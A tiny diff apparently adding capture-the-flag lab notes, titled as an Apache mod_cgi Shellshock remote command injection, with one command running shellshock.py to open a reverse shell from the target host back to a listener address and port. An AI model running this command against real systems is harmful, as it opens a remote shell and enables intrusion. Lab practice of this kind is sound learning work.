@@ -1,0 +1,4 @@
+Apache mod_cgi - 'Shellshock' Remote Command Injection 
+
+
+./shellshock.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.12 lport=12345 pages=/cgi-bin/user.sh
